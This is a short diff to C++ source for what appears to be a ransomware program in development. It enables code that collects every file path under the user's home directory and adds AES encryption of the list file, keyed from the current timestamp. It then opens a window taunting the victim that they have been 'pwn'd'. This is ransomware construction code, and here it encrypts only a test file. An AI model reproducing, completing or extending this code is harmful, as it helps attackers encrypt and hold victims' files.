@@ -13,20 +13,25 @@ int main(int argc, char* argv[]) {
     if (nowUnix.size() > 16) {
         nowUnix.resize(16);
     }
+    AutoSeededRandomPool asrp;
+    SecByteBlock iv(AES::BLOCKSIZE);
+    asrp.GenerateBlock(iv, sizeof(iv));
     SecByteBlock key = lars::logic::strToSbb(nowUnix);
     if (SDL_Init(SDL_INIT_EVERYTHING) != 0) {
         std::cout << "SDL_Init Error: " << SDL_GetError() << std::endl;
         return 1;
     }
+    std::string testfile = "bederaldinnasif.txt";
     std::cout << nowUnix;
-    /*fs::path path = usrHome.c_str();
+    fs::path path = usrHome.c_str();
     std::vector<fs::path> file_paths;
-    std::ofstream f("bederaldinnasif.txt");
+    std::ofstream f(testfile);
     lars::logic::collect_files(path, file_paths);
     for (const auto& file_path : file_paths) {
         f << file_path << std::endl;
     }
-    f.close(); */
+    f.close();
+    lars::aes::encrypt(testfile, key, iv);
     SDL_Window* window = SDL_CreateWindow("UwU you've been pwn'd by a gay, a furry, and a hacker",
         SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED,
         width, height, SDL_WINDOW_ALLOW_HIGHDPI);
